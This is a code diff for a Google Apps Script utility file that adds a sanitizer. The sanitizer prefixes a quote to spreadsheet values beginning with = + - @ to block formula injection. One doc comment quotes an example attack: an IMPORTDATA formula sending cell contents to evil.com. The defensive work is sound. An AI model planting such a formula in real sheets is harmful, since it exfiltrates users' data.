@@ -1,5 +1,5 @@
 /**
- * VERSION: 6.0.065
+ * VERSION: 6.0.066
  * FILE: 14_Utils.gs
  * LMDS V6.0 — Utility Functions
  * ===================================================
@@ -1385,3 +1385,55 @@ function buildGlobalAliasDedupSet_() {
 //   ถูกแทนที่ด้วย chunked cache helpers (saveChunkedCache_/loadChunkedCache_/invalidateChunkedCache_)
 //   ตั้งแต่ V5.5.008+ ซึ่งรองรับ payloads >100KB
 //   หากมี external caller ที่ต้องการ restore → ดู git history ของ commit นี้
+
+// ============================================================
+// SECTION 13: [V6.0.066] Formula Injection Sanitizer
+//   ป้องกัน user input ที่ขึ้นต้นด้วย =+-@ ถูกตีความเป็น formula ใน Google Sheets
+//   Reviewer #3 (AUD3-NEW-012 + Protocol S-03)
+// ============================================================
+
+/**
+ * sanitizeForSheet_ — [V6.0.066] Sanitize value before writing to Google Sheets
+ *   เพื่อป้องกัน Formula Injection
+ *
+ *   Google Sheets ตีความ cell ที่ขึ้นต้นด้วย = + - @ เป็น formula
+ *   ถ้า user input มีอักขระเหล่านี้ที่ตำแหน่งแรก → อาจถูก execute เป็น formula
+ *   เช่น "=IMPORTDATA("http://evil.com/steal?data="&A1)" → ดึงข้อมูลจาก cell อื่น
+ *
+ *   วิธีแก้: ถ้า value ขึ้นต้นด้วย = + - @ ให้เติม single quote (') นำหน้า
+ *   Google Sheets จะตีความเป็น text แทน formula
+ *
+ * @param {string|number|boolean|null} value - ค่าที่จะเขียนลง Sheets
+ * @return {string|number|boolean|null} ค่าที่ sanitized แล้ว (ถ้าเป็น string ที่อันตราย → เติม ' นำหน้า)
+ * @private
+ */
+function sanitizeForSheet_(value) {
+  // ถ้าไม่ใช่ string → ไม่ต้อง sanitize (number/boolean/date ปลอดภัย)
+  if (typeof value !== 'string') return value;
+
+  // ถ้า string ว่าง → ไม่ต้อง sanitize
+  if (value.length === 0) return value;
+
+  // ตรวจอักขระแรก — ถ้าเป็น = + - @ → เติม ' นำหน้า
+  const firstChar = value.charAt(0);
+  if (firstChar === '=' || firstChar === '+' || firstChar === '-' || firstChar === '@') {
+    return "'" + value;
+  }
+
+  return value;
+}
+
+/**
+ * sanitizeRowForSheet_ — [V6.0.066] Sanitize entire row (array of values) before setValues
+ *   ใช้สำหรับ row ที่จะเขียนลง Sheets ผ่าน setValues([row])
+ *
+ * @param {Array} row - array ของ values ที่จะเขียนลง 1 row
+ * @return {Array} array ใหม่ที่ผ่าน sanitizeForSheet_ ทุก element
+ * @private
+ */
+function sanitizeRowForSheet_(row) {
+  if (!row || !Array.isArray(row)) return row;
+  return row.map(function (val) {
+    return sanitizeForSheet_(val);
+  });
+}
